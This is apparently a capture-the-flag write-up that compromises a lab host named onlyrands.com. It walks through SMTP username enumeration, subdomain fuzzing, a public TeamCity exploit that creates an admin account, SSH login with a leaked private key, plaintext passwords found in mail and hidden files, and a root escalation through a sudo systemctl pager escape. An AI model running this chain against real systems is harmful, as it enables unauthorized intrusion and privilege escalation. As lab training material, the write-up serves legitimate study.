nmap shows ports 22, 25 and 80  open
Nothing interesting on port 80, gobuster, so we begin with smtp-user-enum.

```zsh
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 192.168.121.91
192.168.121.91: bin exists
192.168.121.91: finance exists
192.168.121.91: irc exists
192.168.121.91: mail exists
192.168.121.91: man exists
192.168.121.91: root exists
192.168.121.91: sys exists
```
Then upon not discovering any leads, subdomain fuzz
Found nothing on top1million-5000, so moved to 110000
```zsh
wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://onlyrands.com/" -H "Host: FUZZ.onlyrands.com" --hl 677
```

We're now greeted with a TeamCity Login page. version 2023.05.3
Looking up in searchsploit, we find a script that creates us an admin-level account (?)

```zsh
python 52411.py --url http://teams.onlyrands.com --verbose
#imbrahimsql : ibrahimsql
#Login using this account, and find out that one of the devs, marcot, had accidentally uploaded their id_rsa
#copy it as id_rsa_marcot
ssh2john id_rsa_marcot
ssh marcot@IP -d id_rsa_marcot #cheer
```
marcot!

---
```zsh
#no special privs
cd /var/mail
cat *
#we find a mail from matthewa, stating his password IdealismEngineAshen476
su matthewa #IdealismEngineAshen476

#In matthewa's home dir, we find a hidden file .~
cat .~
#Dach's password is "RefriedScabbedWasting502"
#Looking at the mails, we find dach is briand

su briand

sudo -l
#(root) NOPASSWD: /usr/bin/systemctl status teamcity-server.service
#GTFO bins changed, this method not present anymore

sudo /usr/bin/systemctl status teamcity-server.service
!sh
#root!
```
